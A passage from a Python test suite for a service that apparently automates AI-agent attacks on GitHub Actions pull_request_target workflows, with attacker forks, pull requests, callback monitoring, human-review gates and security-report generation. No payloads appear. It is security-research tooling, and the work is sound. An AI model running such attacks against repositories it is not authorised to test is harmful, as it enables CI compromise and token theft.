        if len(run_calls) >= 2:
            (kwargs["workspace_path"] / "REPORT.md").write_text(
                "### Summary\n\nHosted verification confirmed vulnerability.\n",
                encoding="utf-8",
            )
        return {"ok": True, "exit_code": 0}

    service._run_agent_with_fallback = fake_run_agent_with_fallback  # type: ignore[method-assign]

    result = service.execute_attack(
        user_a_token="token-a",
        user_b_token="token-b",
        user_a_fork="playground/repo",
        user_b_fork="attacker/repo",
        workspace_path=workspace_path,
        default_branch="main",
        repo_name="owner/repo",
        focused_workflow=".github/workflows/claude-code-review.yml",
        risk_index=1,
    )

    assert result["vulnerable"] is True
    assert len(run_calls) == 2
    security_report = result["security_report"]
    assert security_report["status"] == "generated"
    assert security_report["verification_sources"] == ["hosted"]
    persisted_path = Path(security_report["persisted_path"])
    assert persisted_path.exists()
    assert (
        persisted_path.name
        == "owner-repo-risk-2-github-workflows-claude-code-review.yml.md"
    )
    assert "Hosted verification confirmed vulnerability" in persisted_path.read_text(
        encoding="utf-8"
    )
    assert security_report["workspace_path"] == str(workspace_path / "REPORT.md")


def test_execute_attack_generates_security_report_for_act_only_verification(
    tmp_path: Path,
) -> None:
    workspace_path = tmp_path / "workspace"
    reports_dir = tmp_path / "security-reports"
    sandbox = _ExecuteSandbox()
    service = AttackExecutionService(
        github_client_factory=lambda token: _ExecuteGitHubClient(token),
        hookbin_client=_ExecuteHookbinClient(),
        sandbox_manager=_ExecuteSandboxManager(sandbox),
        security_reports_dir=reports_dir,
        generate_security_report=True,
    )
    service._monitor_workflow = lambda **kwargs: {  # type: ignore[method-assign]
        "vulnerable": False,
        "attempts": [
            {
                "attempt": 1,
                "conclusion": "failure",
                "agent_output": {"local_test_result": "success"},
            }
        ],
    }
    run_calls: list[dict[str, object]] = []

    def fake_run_agent_with_fallback(**kwargs):
        run_calls.append(kwargs)
        if len(run_calls) >= 2:
            (kwargs["workspace_path"] / "REPORT.md").write_text(
                "### Summary\n\nLocal act validation confirmed exploitability.\n",
                encoding="utf-8",
            )
        return {"ok": True, "exit_code": 0}

    service._run_agent_with_fallback = fake_run_agent_with_fallback  # type: ignore[method-assign]

    result = service.execute_attack(
        user_a_token="token-a",
        user_b_token="token-b",
        user_a_fork="playground/repo",
        user_b_fork="attacker/repo",
        workspace_path=workspace_path,
        default_branch="main",
        repo_name="owner/repo",
        focused_workflow=".github/workflows/ci.yml",
        risk_index=0,
    )

    assert result["vulnerable"] is False
    assert len(run_calls) == 2
    security_report = result["security_report"]
    assert security_report["status"] == "generated"
    assert security_report["verification_sources"] == ["act"]
    persisted_path = Path(security_report["persisted_path"])
    assert persisted_path.exists()
    assert persisted_path.name == "owner-repo-risk-1-github-workflows-ci.yml.md"


def test_execute_attack_skips_security_report_when_feature_flag_disabled(
    tmp_path: Path,
) -> None:
    workspace_path = tmp_path / "workspace"
    reports_dir = tmp_path / "security-reports"
    sandbox = _ExecuteSandbox()
    service = AttackExecutionService(
        github_client_factory=lambda token: _ExecuteGitHubClient(token),
        hookbin_client=_ExecuteHookbinClient(),
        sandbox_manager=_ExecuteSandboxManager(sandbox),
        security_reports_dir=reports_dir,
    )
    service._monitor_workflow = lambda **kwargs: {"vulnerable": True}  # type: ignore[method-assign]
    run_calls: list[dict[str, object]] = []
    service._run_agent_with_fallback = (  # type: ignore[method-assign]
        lambda **kwargs: run_calls.append(kwargs) or {"ok": True, "exit_code": 0}
    )

    result = service.execute_attack(
        user_a_token="token-a",
        user_b_token="token-b",
        user_a_fork="playground/repo",
        user_b_fork="attacker/repo",
        workspace_path=workspace_path,
        default_branch="main",
        repo_name="owner/repo",
        focused_workflow=".github/workflows/ci.yml",
    )

    assert result["vulnerable"] is True
    assert len(run_calls) == 1
    assert "security_report" not in result
    assert not reports_dir.exists()


def test_execute_attack_skips_security_report_when_verification_missing(
    tmp_path: Path,
) -> None:
    workspace_path = tmp_path / "workspace"
    reports_dir = tmp_path / "security-reports"
    sandbox = _ExecuteSandbox()
    service = AttackExecutionService(
        github_client_factory=lambda token: _ExecuteGitHubClient(token),
        hookbin_client=_ExecuteHookbinClient(),
        sandbox_manager=_ExecuteSandboxManager(sandbox),
        security_reports_dir=reports_dir,
        generate_security_report=True,
    )
    service._monitor_workflow = lambda **kwargs: {  # type: ignore[method-assign]
        "vulnerable": False,
        "attempts": [{"attempt": 1, "local_test_result": "failure"}],
    }
    run_calls: list[dict[str, object]] = []
    service._run_agent_with_fallback = (  # type: ignore[method-assign]
        lambda **kwargs: run_calls.append(kwargs) or {"ok": True, "exit_code": 0}
    )

    result = service.execute_attack(
        user_a_token="token-a",
        user_b_token="token-b",
        user_a_fork="playground/repo",
        user_b_fork="attacker/repo",
        workspace_path=workspace_path,
        default_branch="main",
        repo_name="owner/repo",
        focused_workflow=".github/workflows/ci.yml",
    )

    assert result["vulnerable"] is False
    assert len(run_calls) == 1
    assert "security_report" not in result


def test_execute_attack_marks_security_report_failed_when_followup_does_not_write_file(
    tmp_path: Path,
) -> None:
    workspace_path = tmp_path / "workspace"
    reports_dir = tmp_path / "security-reports"
    sandbox = _ExecuteSandbox()
    service = AttackExecutionService(
        github_client_factory=lambda token: _ExecuteGitHubClient(token),
        hookbin_client=_ExecuteHookbinClient(),
        sandbox_manager=_ExecuteSandboxManager(sandbox),
        security_reports_dir=reports_dir,
        generate_security_report=True,
    )
    service._monitor_workflow = lambda **kwargs: {"vulnerable": True}  # type: ignore[method-assign]
    run_calls: list[dict[str, object]] = []
    service._run_agent_with_fallback = (  # type: ignore[method-assign]
        lambda **kwargs: run_calls.append(kwargs) or {"ok": True, "exit_code": 0}
    )

    result = service.execute_attack(
        user_a_token="token-a",
        user_b_token="token-b",
        user_a_fork="playground/repo",
        user_b_fork="attacker/repo",
        workspace_path=workspace_path,
        default_branch="main",
        repo_name="owner/repo",
        focused_workflow=".github/workflows/ci.yml",
    )

    assert result["vulnerable"] is True
    assert len(run_calls) == 2
    security_report = result["security_report"]
    assert security_report["status"] == "failed"
    assert "REPORT.md" in security_report["error"]
    assert reports_dir.exists()


def test_extract_write_github_token_permissions() -> None:
    service = AttackExecutionService(github_client_factory=lambda _token: object())
    permissions = service._extract_write_github_token_permissions(  # noqa: SLF001
        {
            "status": "write",
            "permissions": {
                "pull-requests": "write",
                "contents": "read",
                "issues": "write",
            },
        }
    )
    assert permissions == ["issues", "pull-requests"]


def test_build_security_report_prompt_includes_permission_context_and_no_payload() -> None:
    service = AttackExecutionService(github_client_factory=lambda _token: object())
    prompt = service._build_security_report_follow_up_prompt(  # noqa: SLF001
        repository_name="owner/repo",
        focused_workflow=".github/workflows/ci.yml",
        pull_request_url="https://github.com/owner/repo/pull/1",
        verification_sources=["hosted"],
        github_token_permission_status="write",
        github_token_write_permissions=["pull-requests", "issues"],
    )
    assert "Known `GITHUB_TOKEN` permission status: `write`" in prompt
    assert "Known write-scoped `GITHUB_TOKEN` permissions: `pull-requests, issues`" in prompt
    assert "Evidence payload" not in prompt


def test_execute_attack_requires_three_safe_openhands_conversations(
    tmp_path: Path,
) -> None:
    sandbox = _ExecuteSandboxWithOpenHands(
        controller_signals=[
            {
                "vulnerable": "no",
                "human_review_needed": False,
                "reason": "no exploitable pull_request_target path found",
                "notes": "",
            },
            {
                "vulnerable": "no",
                "human_review_needed": False,
                "reason": "workflow gating prevents untrusted execution",
                "notes": "",
            },
            {
                "vulnerable": "no",
                "human_review_needed": False,
                "reason": "cross-repo trigger is blocked by repository policy",
                "notes": "",
            },
        ]
    )
    (tmp_path / "workspace").mkdir(parents=True, exist_ok=True)
    (tmp_path / "agent-task.md").write_text("do work\n", encoding="utf-8")
    service = AttackExecutionService(
        github_client_factory=lambda token: _ExecuteGitHubClient(token),
        hookbin_client=_ExecuteHookbinClient(),
        sandbox_manager=_ExecuteSandboxManager(sandbox),
    )

    result = service.execute_attack(
        user_a_token="token-a",
        user_b_token="token-b",
        user_a_fork="playground/repo",
        user_b_fork="attacker/repo",
        workspace_path=tmp_path / "workspace",
        default_branch="main",
        repo_name="owner/repo",
    )

    assert result["vulnerable"] is False
    assert result["controller_signal"]["status"] == "not_vulnerable"
    assert len(result["safe_conversation_confirmations"]) == 3
    assert [
        entry["reason"] for entry in result["safe_conversation_confirmations"]
    ] == [
        "no exploitable pull_request_target path found",
        "workflow gating prevents untrusted execution",
        "cross-repo trigger is blocked by repository policy",
    ]
    assert sandbox.committed is False
    assert sandbox.stopped is True
    assert sandbox.removed is True


def test_execute_attack_runs_human_review_precheck_before_sandbox(tmp_path: Path) -> None:
    sandbox = _ExecuteSandbox()
    sandbox_manager = _ExecuteSandboxManager(sandbox)
    service = AttackExecutionService(
        github_client_factory=lambda token: _ExecuteGitHubClient(token),
        hookbin_client=_ExecuteHookbinClient(),
        sandbox_manager=sandbox_manager,
    )

    result = service.execute_attack(
        user_a_token="token-a",
        user_b_token="token-b",
        user_a_fork="playground/repo",
        user_b_fork="attacker/repo",
        workspace_path=tmp_path / "workspace",
        default_branch="main",
        repo_name="owner/repo",
        ai_analysis={
            "vulnerable": True,
            "confidence": "high",
            "explanation": "Maintainer label trust gate exists.",
            "impact": "RCE",
            "poc": "x",
        },
        human_review_precheck=lambda **kwargs: {
            "needs_human_review": True,
            "reason": "Trust gate requires manual review.",
        },
        human_review_precheck_metadata={"repository_name": "owner/repo"},
    )

    assert result["vulnerable"] is False
    assert result["needs_human_review"] is True
    assert result["status"] == "human_review_required"
    assert result["controller_signal"]["source"] == "gemini_human_review_precheck"
    assert sandbox_manager.create_calls == 0
    assert sandbox.cloned is False


def test_execute_attack_continues_when_focused_workflow_runner_is_legacy(
    tmp_path: Path,
) -> None:
    sandbox = _ExecuteSandbox()
    sandbox_manager = _ExecuteSandboxManager(sandbox)
    service = AttackExecutionService(
        github_client_factory=lambda token: _ExecuteGitHubClient(token),
        hookbin_client=_ExecuteHookbinClient(),
        sandbox_manager=sandbox_manager,
    )
    service._monitor_workflow = lambda **kwargs: {"vulnerable": False}  # type: ignore[method-assign]
    workspace = tmp_path / "workspace"
    workflow_path = workspace / ".github/workflows/legacy.yml"
    workflow_path.parent.mkdir(parents=True, exist_ok=True)
    workflow_path.write_text(
        (
            "name: Legacy CI\n"
            "on:\n"
            "  pull_request_target:\n"
            "jobs:\n"
            "  test:\n"
            "    runs-on: ubuntu-20.04\n"
            "    steps:\n"
            "      - run: echo test\n"
        ),
        encoding="utf-8",
    )

    result = service.execute_attack(
        user_a_token="token-a",
        user_b_token="token-b",
        user_a_fork="playground/repo",
        user_b_fork="attacker/repo",
        workspace_path=workspace,
        default_branch="main",
        focused_workflow=".github/workflows/legacy.yml",
        repo_name="owner/repo",
    )

    assert result["vulnerable"] is False
    assert result.get("needs_human_review") is not True
    assert result["pull_request_url"] == "https://github.com/playground/repo/pull/42"
    assert sandbox_manager.create_calls == 1
    assert sandbox.cloned is True


def test_execute_attack_accepts_matrix_runs_on_when_matrix_resolves_to_supported_image(
    tmp_path: Path,
) -> None:
    sandbox = _ExecuteSandbox()
    user_a_client = _ExecuteGitHubClient("token-a")
    user_b_client = _ExecuteGitHubClient("token-b")
    service = AttackExecutionService(
        github_client_factory=lambda token: (
            user_a_client if token == "token-a" else user_b_client
        ),
        hookbin_client=_ExecuteHookbinClient(),
        sandbox_manager=_ExecuteSandboxManager(sandbox),
    )
    service._monitor_workflow = lambda **kwargs: {"vulnerable": False}  # type: ignore[method-assign]
    workspace = tmp_path / "workspace"
    workflow_path = workspace / ".github/workflows/openai.yml"
    workflow_path.parent.mkdir(parents=True, exist_ok=True)
    workflow_path.write_text(
        (
            "name: OpenAI\n"
            "on:\n"
            "  pull_request_target:\n"
            "    branches: [\"main\"]\n"
            "jobs:\n"
            "  test:\n"
            "    strategy:\n"
            "      matrix:\n"
            "        os: [ubuntu-latest]\n"
            "        python-version: [\"3.9\", \"3.10\"]\n"
            "    runs-on: ${{ matrix.os }}\n"
            "    steps:\n"
            "      - run: echo ok\n"
        ),
        encoding="utf-8",
    )

    result = service.execute_attack(
        user_a_token="token-a",
        user_b_token="token-b",
        user_a_fork="playground/repo",
        user_b_fork="attacker/repo",
        workspace_path=workspace,
        default_branch="main",
        focused_workflow=".github/workflows/openai.yml",
        repo_name="owner/repo",
    )

    assert result["vulnerable"] is False
    assert result.get("needs_human_review") is not True
    assert result["pull_request_url"] == "https://github.com/playground/repo/pull/42"


def test_execute_attack_continues_when_any_path_workflow_runner_is_legacy(
    tmp_path: Path,
) -> None:
    sandbox = _ExecuteSandbox()
    sandbox_manager = _ExecuteSandboxManager(sandbox)
    service = AttackExecutionService(
        github_client_factory=lambda token: _ExecuteGitHubClient(token),
        hookbin_client=_ExecuteHookbinClient(),
        sandbox_manager=sandbox_manager,
    )
    service._monitor_workflow = lambda **kwargs: {"vulnerable": False}  # type: ignore[method-assign]
    workspace = tmp_path / "workspace"
    workflows_dir = workspace / ".github/workflows"
    workflows_dir.mkdir(parents=True, exist_ok=True)
    (workflows_dir / "supported.yml").write_text(
        (
            "name: Supported\n"
            "on:\n"
            "  pull_request_target:\n"
            "jobs:\n"
            "  test:\n"
            "    runs-on: ubuntu-latest\n"
            "    steps:\n"
            "      - run: echo ok\n"
        ),
        encoding="utf-8",
    )
    (workflows_dir / "legacy.yml").write_text(
        (
            "name: Legacy\n"
            "on:\n"
            "  pull_request_target:\n"
            "jobs:\n"
            "  test:\n"
            "    runs-on: ubuntu-20.04\n"
            "    steps:\n"
            "      - run: echo legacy\n"
        ),
        encoding="utf-8",
    )

    result = service.execute_attack(
        user_a_token="token-a",
        user_b_token="token-b",
        user_a_fork="playground/repo",
        user_b_fork="attacker/repo",
        workspace_path=workspace,
        default_branch="main",
        focused_workflows=[
            ".github/workflows/supported.yml",
            ".github/workflows/legacy.yml",
        ],
        repo_name="owner/repo",
    )

    assert result["vulnerable"] is False
    assert result.get("needs_human_review") is not True
    assert result["pull_request_url"] == "https://github.com/playground/repo/pull/42"
    assert sandbox_manager.create_calls == 1
    assert sandbox.cloned is True


def test_execute_attack_does_not_fetch_external_workflows_for_runner_validation(
    tmp_path: Path,
) -> None:
    sandbox = _ExecuteSandbox()
    user_a_client = _ExecuteGitHubClient("token-a")
    user_b_client = _ExecuteGitHubClient("token-b")

    class _RemoteWorkflowClient(_ExecuteGitHubClient):
        def get_file_content(self, repo_name: str, path: str, ref: str) -> str:
            self.fetched_workflows.append((repo_name, path, ref))
            if repo_name == "external/workflows" and path == ".github/workflows/legacy.yml":
                return (
                    "name: External\n"
                    "on:\n"
                    "  pull_request_target:\n"
                    "jobs:\n"
                    "  test:\n"
                    "    runs-on: ubuntu-20.04\n"
                    "    steps:\n"
                    "      - run: echo external\n"
                )
            return super().get_file_content(repo_name, path, ref)

    user_a_client = _RemoteWorkflowClient("token-a")
    service = AttackExecutionService(
        github_client_factory=lambda token: (
            user_a_client if token == "token-a" else user_b_client
        ),
        hookbin_client=_ExecuteHookbinClient(),
        sandbox_manager=_ExecuteSandboxManager(sandbox),
    )
    service._monitor_workflow = lambda **kwargs: {"vulnerable": False}  # type: ignore[method-assign]
    workspace = tmp_path / "workspace"
    workflows_dir = workspace / ".github/workflows"
    workflows_dir.mkdir(parents=True, exist_ok=True)
    (workflows_dir / "supported.yml").write_text(
        (
            "name: Supported\n"
            "on:\n"
            "  pull_request_target:\n"
            "jobs:\n"
            "  test:\n"
            "    runs-on: ubuntu-latest\n"
            "    steps:\n"
            "      - run: echo ok\n"
        ),
        encoding="utf-8",
    )

    result = service.execute_attack(
        user_a_token="token-a",
        user_b_token="token-b",
        user_a_fork="playground/repo",
        user_b_fork="attacker/repo",
        workspace_path=workspace,
        default_branch="main",
        focused_workflow=".github/workflows/supported.yml",
        focused_workflows=[".github/workflows/supported.yml"],
        focused_workflow_refs=[
            {
                "repo_name": "owner/repo",
                "path": ".github/workflows/supported.yml",
                "ref": "main",
            },
            {
                "repo_name": "external/workflows",
                "path": ".github/workflows/legacy.yml",
                "ref": "main",
            },
        ],
        repo_name="owner/repo",
    )

    assert result["vulnerable"] is False
    assert result.get("needs_human_review") is not True
    assert result["pull_request_url"] == "https://github.com/playground/repo/pull/42"
    assert user_a_client.fetched_workflows == []


def test_execute_attack_respects_human_review_controller_signal(tmp_path: Path) -> None:
    sandbox = _ExecuteSandbox(
        controller_signal={
            "vulnerable": "unconfirmed",
            "human_review_needed": True,
            "reason": "requires paid SaaS account for callback validation",
            "required_resources": [
                "paid SaaS account",
                "maintainer-provided credentials",
            ],
            "notes": "",
        }
    )
    service = AttackExecutionService(
        github_client_factory=lambda token: _ExecuteGitHubClient(token),
        hookbin_client=_ExecuteHookbinClient(),
        sandbox_manager=_ExecuteSandboxManager(sandbox),
    )

    result = service.execute_attack(
        user_a_token="token-a",
        user_b_token="token-b",
        user_a_fork="playground/repo",
        user_b_fork="attacker/repo",
        workspace_path=tmp_path / "workspace",
        default_branch="main",
        repo_name="owner/repo",
    )

    assert result["vulnerable"] is False
    assert result["needs_human_review"] is True
    assert result["status"] == "human_review_required"
    assert result["reason"] == "requires paid SaaS account for callback validation"
    assert result["required_resources"] == [
        "paid SaaS account",
        "maintainer-provided credentials",
    ]
    assert result["controller_signal"]["status"] == "needs_human_review"
    assert sandbox.committed is False
    assert sandbox.stopped is True
    assert sandbox.removed is True


def test_execute_attack_returns_pull_request_url_in_result(
    tmp_path: Path,
    caplog,
) -> None:
    sandbox = _ExecuteSandbox()
    user_a_client = _ExecuteGitHubClient("token-a")
    user_b_client = _ExecuteGitHubClient("token-b")
    service = AttackExecutionService(
        github_client_factory=lambda token: (
            user_a_client if token == "token-a" else user_b_client
        ),
        hookbin_client=_ExecuteHookbinClient(),
        sandbox_manager=_ExecuteSandboxManager(sandbox),
    )
    service._monitor_workflow = lambda **kwargs: {"vulnerable": False}  # type: ignore[method-assign]

    with caplog.at_level("INFO"):
        result = service.execute_attack(
            user_a_token="token-a",
            user_b_token="token-b",
            user_a_fork="playground/repo",
            user_b_fork="attacker/repo",
            workspace_path=tmp_path / "workspace",
            default_branch="main",
            repo_name="owner/repo",
        )

    assert result["pull_request_url"] == "https://github.com/playground/repo/pull/42"
    assert "pr_number" not in result
    assert user_b_client.created_pr_payload is not None
    assert user_b_client.created_pr_payload["repo_name"] == "playground/repo"
    assert user_b_client.created_pr_payload["head"].startswith("attacker:")
    assert (
        "[PWNHUNTER] Pull request URL: https://github.com/playground/repo/pull/42"
        in caplog.text
    )


def test_execute_attack_retries_when_no_files_changed(
    monkeypatch,
    tmp_path: Path,
) -> None:
    sandbox = _NoStagedChangesExecuteSandbox(changed_status="")
    user_a_client = _ExecuteGitHubClient("token-a")
    user_b_client = _ExecuteGitHubClient("token-b")
    service = AttackExecutionService(
        github_client_factory=lambda token: (
            user_a_client if token == "token-a" else user_b_client
        ),
        hookbin_client=_ExecuteHookbinClient(),
        sandbox_manager=_ExecuteSandboxManager(sandbox),
    )
    retry_calls: list[dict[str, object]] = []
    monkeypatch.setattr(
        service,
        "_retry_after_no_changes",
        lambda **kwargs: retry_calls.append(kwargs) or {"committed": False},
    )

    result = service.execute_attack(
        user_a_token="token-a",
        user_b_token="token-b",
        user_a_fork="playground/repo",
        user_b_fork="attacker/repo",
        workspace_path=tmp_path / "workspace",
        default_branch="main",
        repo_name="owner/repo",
    )

    assert len(retry_calls) == 2
    assert result["vulnerable"] is False
    assert (
        result["reason"]
        == "Agent produced no code changes and did not provide a controller decision after retries."
    )
    assert user_b_client.created_pr_payload is None


def test_execute_attack_retries_once_when_no_files_changed_with_max_retries_one(
    monkeypatch,
    tmp_path: Path,
) -> None:
    sandbox = _NoStagedChangesExecuteSandbox(changed_status="")
    user_a_client = _ExecuteGitHubClient("token-a")
    user_b_client = _ExecuteGitHubClient("token-b")
    service = AttackExecutionService(
        github_client_factory=lambda token: (
            user_a_client if token == "token-a" else user_b_client
        ),
        hookbin_client=_ExecuteHookbinClient(),
        sandbox_manager=_ExecuteSandboxManager(sandbox),
    )
    retry_calls: list[dict[str, object]] = []
    monkeypatch.setattr(
        service,
        "_retry_after_no_changes",
        lambda **kwargs: retry_calls.append(kwargs) or {"committed": False},
    )

    result = service.execute_attack(
        user_a_token="token-a",
        user_b_token="token-b",
        user_a_fork="playground/repo",
        user_b_fork="attacker/repo",
        workspace_path=tmp_path / "workspace",
        default_branch="main",
        repo_name="owner/repo",
        max_retries=1,
    )

    assert len(retry_calls) == 1
    assert result["vulnerable"] is False
    assert (
        result["reason"]
        == "Agent produced no code changes and did not provide a controller decision after retries."
    )
    assert user_b_client.created_pr_payload is None


def test_execute_attack_retries_when_changes_are_not_committable(
    monkeypatch,
    tmp_path: Path,
) -> None:
    sandbox = _NoStagedChangesExecuteSandbox(changed_status=" M docker-compose-ci.yml\n")
    user_a_client = _ExecuteGitHubClient("token-a")
    user_b_client = _ExecuteGitHubClient("token-b")
    service = AttackExecutionService(
        github_client_factory=lambda token: (
            user_a_client if token == "token-a" else user_b_client
        ),
        hookbin_client=_ExecuteHookbinClient(),
        sandbox_manager=_ExecuteSandboxManager(sandbox),
    )
    retry_calls: list[dict[str, object]] = []
    monkeypatch.setattr(
        service,
        "_retry_after_non_committable_changes",
        lambda **kwargs: retry_calls.append(kwargs) or {"committed": True},
    )
    service._monitor_workflow = lambda **kwargs: {"vulnerable": False}  # type: ignore[method-assign]

    result = service.execute_attack(
        user_a_token="token-a",
        user_b_token="token-b",
        user_a_fork="playground/repo",
        user_b_fork="attacker/repo",
        workspace_path=tmp_path / "workspace",
        default_branch="main",
        repo_name="owner/repo",
        max_retries=3,
    )

    assert len(retry_calls) == 1
    assert user_b_client.created_pr_payload is not None
    assert result["vulnerable"] is False
    assert result["pull_request_url"] == "https://github.com/playground/repo/pull/42"


def test_execute_attack_retries_once_when_changes_non_committable_with_max_retries_one(
    monkeypatch,
    tmp_path: Path,
) -> None:
    sandbox = _NoStagedChangesExecuteSandbox(changed_status=" M docker-compose-ci.yml\n")
    user_a_client = _ExecuteGitHubClient("token-a")
    user_b_client = _ExecuteGitHubClient("token-b")
    service = AttackExecutionService(
        github_client_factory=lambda token: (
            user_a_client if token == "token-a" else user_b_client
        ),
        hookbin_client=_ExecuteHookbinClient(),
        sandbox_manager=_ExecuteSandboxManager(sandbox),
    )
    retry_calls: list[dict[str, object]] = []
    monkeypatch.setattr(
        service,
        "_retry_after_non_committable_changes",
        lambda **kwargs: retry_calls.append(kwargs) or {"committed": False},
    )

    result = service.execute_attack(
        user_a_token="token-a",
        user_b_token="token-b",
        user_a_fork="playground/repo",
        user_b_fork="attacker/repo",
        workspace_path=tmp_path / "workspace",
        default_branch="main",
        repo_name="owner/repo",
        max_retries=1,
    )

    assert len(retry_calls) == 1
    assert result["vulnerable"] is False
    assert result["needs_human_review"] is True
    assert result["status"] == "human_review_required"
    assert (
        result["reason"]
        == "Repository changed, but controller could not commit any eligible files after retries."
    )
    assert result["controller_signal"]["status"] == "needs_human_review"
    assert (
        result["controller_signal"]["source"]
        == "non_committable_changes_after_retries"
    )
    assert user_b_client.created_pr_payload is None


def test_execute_attack_honors_not_vulnerable_signal_after_no_change_retry(
    monkeypatch,
    tmp_path: Path,
) -> None:
    sandbox = _NoStagedChangesExecuteSandbox(changed_status="")
    user_a_client = _ExecuteGitHubClient("token-a")
    user_b_client = _ExecuteGitHubClient("token-b")
    service = AttackExecutionService(
        github_client_factory=lambda token: (
            user_a_client if token == "token-a" else user_b_client
        ),
        hookbin_client=_ExecuteHookbinClient(),
        sandbox_manager=_ExecuteSandboxManager(sandbox),
    )
    monkeypatch.setattr(
        service,
        "_retry_after_no_changes",
        lambda **kwargs: {
            "committed": False,
            "controller_signal": {
                "status": "not_vulnerable",
                "reason": "no viable pull_request_target execution path found",
            },
        },
    )

    result = service.execute_attack(
        user_a_token="token-a",
        user_b_token="token-b",
        user_a_fork="playground/repo",
        user_b_fork="attacker/repo",
        workspace_path=tmp_path / "workspace",
        default_branch="main",
        repo_name="owner/repo",
    )

    assert result["vulnerable"] is False
    assert result["reason"] == "no viable pull_request_target execution path found"
    assert result["controller_signal"]["status"] == "not_vulnerable"


def test_execute_attack_uses_branch_filter_from_focused_workflow_for_pr_base(
    tmp_path: Path,
) -> None:
    sandbox = _ExecuteSandbox()
    user_a_client = _ExecuteGitHubClient("token-a")
    user_b_client = _ExecuteGitHubClient("token-b")
    service = AttackExecutionService(
        github_client_factory=lambda token: (
            user_a_client if token == "token-a" else user_b_client
        ),
        hookbin_client=_ExecuteHookbinClient(),
        sandbox_manager=_ExecuteSandboxManager(sandbox),
    )
    service._monitor_workflow = lambda **kwargs: {"vulnerable": False}  # type: ignore[method-assign]

    workspace = tmp_path / "workspace"
    workflow_path = workspace / ".github/workflows/summary.yml"
    workflow_path.parent.mkdir(parents=True, exist_ok=True)
    workflow_path.write_text(
        (
            "on:\n"
            "  pull_request_target:\n"
            "    branch:\n"
            "      - master\n"
            "      - release/*\n"
            "jobs:\n"
            "  test:\n"
            "    runs-on: ubuntu-latest\n"
            "    steps:\n"
            "      - run: echo test\n"
        ),
        encoding="utf-8",
    )

    service.execute_attack(
        user_a_token="token-a",
        user_b_token="token-b",
        user_a_fork="playground/repo",
        user_b_fork="attacker/repo",
        workspace_path=workspace,
        default_branch="main",
        focused_workflow=".github/workflows/summary.yml",
        repo_name="owner/repo",
    )

    assert user_b_client.created_pr_payload is not None
    assert user_b_client.created_pr_payload["base"] == "master"


def test_execute_attack_requests_human_review_when_filtered_base_branch_is_missing(
    tmp_path: Path,
) -> None:
    sandbox = _ExecuteSandbox()

    class _MissingMainUserAClient(_ExecuteGitHubClient):
        def get_branch_head_sha(self, repo_name: str, branch: str) -> str:
            if repo_name == "playground/repo" and branch == "main":
                raise GitHubApiError(
                    "GitHub API request failed for /repos/playground/repo/branches/main: 404 Not Found"
                )
            return super().get_branch_head_sha(repo_name, branch)

    user_a_client = _MissingMainUserAClient("token-a")
    user_b_client = _ExecuteGitHubClient("token-b")
    service = AttackExecutionService(
        github_client_factory=lambda token: (
            user_a_client if token == "token-a" else user_b_client
        ),
        hookbin_client=_ExecuteHookbinClient(),
        sandbox_manager=_ExecuteSandboxManager(sandbox),
    )

    workspace = tmp_path / "workspace"
    workflow_path = workspace / ".github/workflows/ci.yml"
    workflow_path.parent.mkdir(parents=True, exist_ok=True)
    workflow_path.write_text(
        (
            "name: CI\n"
            "on:\n"
            "  pull_request_target:\n"
            "    branches:\n"
            "      - main\n"
            "jobs:\n"
            "  test:\n"
            "    runs-on: ubuntu-latest\n"
            "    steps:\n"
            "      - run: echo test\n"
        ),
        encoding="utf-8",
    )

    result = service.execute_attack(
        user_a_token="token-a",
        user_b_token="token-b",
        user_a_fork="playground/repo",
        user_b_fork="attacker/repo",
        workspace_path=workspace,
        default_branch="master",
        focused_workflow=".github/workflows/ci.yml",
        repo_name="owner/repo",
    )

    assert result["vulnerable"] is False
    assert result["needs_human_review"] is True
    assert result["status"] == "human_review_required"
    assert "does not exist on `playground/repo`" in result["reason"]
    assert result["controller_signal"]["status"] == "needs_human_review"
    assert result["controller_signal"]["source"] == "workflow_branch_filter_validation"
    assert user_b_client.created_pr_payload is None
    assert sandbox.checked_out is False
    assert sandbox.stopped is True
    assert sandbox.removed is True


def test_execute_attack_requests_human_review_when_target_base_branch_is_missing(
    tmp_path: Path,
) -> None:
    sandbox = _ExecuteSandbox()

    class _MissingMainUserAClient(_ExecuteGitHubClient):
        def get_branch_head_sha(self, repo_name: str, branch: str) -> str:
            if repo_name == "playground/repo" and branch == "main":
                raise GitHubApiError(
                    "GitHub API request failed for /repos/playground/repo/branches/main: 404 Not Found"
                )
            return super().get_branch_head_sha(repo_name, branch)

    user_a_client = _MissingMainUserAClient("token-a")
    user_b_client = _ExecuteGitHubClient("token-b")
    service = AttackExecutionService(
        github_client_factory=lambda token: (
            user_a_client if token == "token-a" else user_b_client
        ),
        hookbin_client=_ExecuteHookbinClient(),
        sandbox_manager=_ExecuteSandboxManager(sandbox),
    )

    result = service.execute_attack(
        user_a_token="token-a",
        user_b_token="token-b",
        user_a_fork="playground/repo",
        user_b_fork="attacker/repo",
        workspace_path=tmp_path / "workspace",
        default_branch="main",
        repo_name="owner/repo",
    )

    assert result["vulnerable"] is False
    assert result["needs_human_review"] is True
    assert result["status"] == "human_review_required"
    assert result["reason"] == "Target branch `main` does not exist on `playground/repo`."
    assert result["controller_signal"]["status"] == "needs_human_review"
    assert result["controller_signal"]["source"] == "pr_target_branch_validation"
    assert user_b_client.created_pr_payload is None
    assert sandbox.checked_out is False
    assert sandbox.stopped is True
    assert sandbox.removed is True


def test_execute_attack_uses_created_branch_when_filtered_base_branch_is_wildcard(
    tmp_path: Path,
) -> None:
    sandbox = _ExecuteSandbox()

    class _MissingReleaseBranchUserAClient(_ExecuteGitHubClient):
        def get_branch_head_sha(self, repo_name: str, branch: str) -> str:
            created_release_branches = {
                created_branch
                for created_repo, created_branch, _ in self.created_branches
                if created_repo == repo_name
            }
            if branch in created_release_branches:
                return "abc123"
            if repo_name == "playground/repo" and branch.startswith("release/"):
                raise GitHubApiError(
                    f"GitHub API request failed for /repos/{repo_name}/branches/{branch}: 404 Not Found"
                )
            return super().get_branch_head_sha(repo_name, branch)

    user_a_client = _MissingReleaseBranchUserAClient("token-a")
    user_b_client = _ExecuteGitHubClient("token-b")
    service = AttackExecutionService(
        github_client_factory=lambda token: (
            user_a_client if token == "token-a" else user_b_client
        ),
        hookbin_client=_ExecuteHookbinClient(),
        sandbox_manager=_ExecuteSandboxManager(sandbox),
    )
    service._monitor_workflow = lambda **kwargs: {"vulnerable": False}  # type: ignore[method-assign]

    workspace = tmp_path / "workspace"
    workflow_path = workspace / ".github/workflows/ci.yml"
    workflow_path.parent.mkdir(parents=True, exist_ok=True)
    workflow_path.write_text(
        (
            "name: CI\n"
            "on:\n"
